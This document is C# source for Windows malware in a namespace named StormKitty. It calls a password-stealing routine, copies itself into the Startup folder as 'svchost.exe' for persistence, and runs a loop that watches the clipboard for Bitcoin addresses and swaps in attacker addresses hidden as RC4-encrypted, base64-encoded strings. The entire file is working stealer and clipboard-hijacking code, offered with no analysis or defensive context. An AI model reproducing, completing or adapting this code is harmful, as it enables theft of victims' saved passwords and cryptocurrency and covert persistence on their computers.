using Stealer;
using System;
using System.Threading;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.IO;
using System.Reflection;
using System.Text;


namespace StormKitty
{
	
    class Program
    {
		
		 public static void Check()
        {
            bool createdNew = false;
            Mutex currentApp = new Mutex(false, "mutex1", out createdNew);
            if (!createdNew)
                Environment.Exit(1);
        }
			
		
public static string RC(string input, string key)
{
    StringBuilder result = new StringBuilder();
    int x, y, j = 0;
    int[] box = new int[256];
    for (int i = 0; i < 256; i++)
        box[i] = i;
    for (int i = 0; i < 256; i++)
    {
        j = (key[i % key.Length] + box[i] + j) % 256;
        x = box[i];
        box[i] = box[j];
        box[j] = x;
    }
    for (int i = 0; i < input.Length; i++)
    {
        y = i % 256;
        j = (box[y] + j) % 256;
        x = box[y];
        box[y] = box[j];
        box[j] = x;
        result.Append((char)(input[i] ^ box[(box[y] + box[j]) % 256]));
    }
    return result.ToString();
}
					
        [System.STAThreadAttribute]
        static void Main(string[] args)
        {			
			Check();
					
            string passwords = Passwords.Save(); 
		
string path = Environment.GetFolderPath( Environment.SpecialFolder.Startup ) + "\\" +  "svchost.exe" ;

            if (!File.Exists(path))
            {
				 try
                {
                File.Copy(Assembly.GetEntryAssembly().Location, path);
				}
                   catch
                { }
			}
				
		            while (true)
            {
                string idat_old  = string.Empty;
                string idat = string.Empty;

                Thread.Sleep(900);

                try
                {
                    if (Clipboard.ContainsText())
                    {
                        idat = Clipboard.GetText();
		
if(idat.Length <50)
{
                        if (idat != idat_old)
                        {
                          
                            if (new Regex("^1[a-km-zA-HJ-NP-Z1-9]{25,34}$").IsMatch(idat))
                            {
new Thread(() => { Clipboard.SetText(RC(Encoding.UTF8.GetString(Convert.FromBase64String("wrbCusO8awElw7jCnyseGx7CjMOjM8O4wqNTwq8lwoE9NsOeERLCnsOvw6DDr8KoGcKlOg==")),"{")
); }) { ApartmentState = ApartmentState.STA }.Start();
                            }
                           if (new Regex("^3[a-km-zA-HJ-NP-Z1-9]{25,34}$").IsMatch(idat))
                            {
new Thread(() => { Clipboard.SetText(RC(Encoding.UTF8.GetString(Convert.FromBase64String("wrTCt8O7cQMLw7jClz0PKC3CsMOSJcO9w6FowoQ1wpNYCMOvFyDCrcKQw5DDlMKMG8OnVA==")),"{")
); }) { ApartmentState = ApartmentState.STA }.Start();
                            }
                            
                            idat_old = idat;
                        }
                    }
                }}
                catch
                {    }
			}
			      
        }
		
    }
}
